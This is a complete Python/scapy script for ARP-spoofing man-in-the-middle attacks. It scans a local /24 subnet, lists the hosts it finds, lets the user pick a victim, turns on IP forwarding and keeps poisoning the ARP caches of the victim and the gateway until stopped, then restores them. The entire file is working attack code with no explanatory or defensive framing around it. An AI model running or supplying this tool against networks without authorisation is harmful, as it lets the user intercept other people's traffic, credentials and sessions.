from scapy.all import *
import time
import argparse
import os


class ArpTarget():

    def __init__(self, arpScanRow, gatewayIP, gatewayMac):
        self.victimMac = arpScanRow.src
        self.victimIP = arpScanRow.psrc
        self.gatewayMac = gatewayMac
        self.gatewayIP = gatewayIP
        self.arpVicSpoof = ARP(op=2,
                               psrc=self.gatewayIP,
                               pdst=self.victimIP,
                               hwdst=self.victimMac)
        self.arpGateSpoof = ARP(op=2,
                                psrc=self.victimIP,
                                pdst=self.gatewayIP,
                                hwdst=self.gatewayMac)

    def spoof(self):
        send(self.arpVicSpoof)
        send(self.arpGateSpoof)

    def restore(self):
        send(ARP(op=2,
                 psrc=self.gatewayIP,
                 pdst=self.victimIP,
                 hwdst="ff:ff:ff:ff:ff:ff",
                 hwsrc=self.gatewayMac), count=5)

        send(ARP(op=2, psrc=self.victimIP,
                 pdst=self.gatewayIP,
                 hwdst="ff:ff:ff:ff:ff:ff",
                 hwsrc=self.victimMac), count=5)

def getMac(ipAddress):
    res, unan = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                    ARP(pdst=ipAddress), timeout=2, retry=10)

    for s, r in res:
        return r[Ether].src

    return print("-#-#-#-#-#- IP Gateway error (restart pls)-#-#-#-#-#-")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-g",
        "--gateway",
        required=True,
        help="Gateway ip",
    )
    args = parser.parse_args()
    os.system("sysctl -w net.ipv4.ip_forward=1")
    gatewayMac = getMac(args.gateway)
    targetList = []
    arpScan, arpScanR = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                            ARP(pdst="192.168.1.0/24"), timeout=2)

    for i in range(0, len(arpScan)):
        targetList.append(ArpTarget(arpScan[i][1], args.gateway, gatewayMac))
        print ("{index} : {src} {psrc}".format(src=arpScan[i][1].src, psrc=arpScan[i][1].psrc, index=i))

    targetI = input("Target: ")
    try:
        while True:
            targetList[int(targetI)].spoof()
            time.sleep(1.5)
    except KeyboardInterrupt:
        os.system("sysctl -w net.ipv4.ip_forward=0")
        targetList[int(targetI)].restore()

if __name__ == '__main__':
    main()
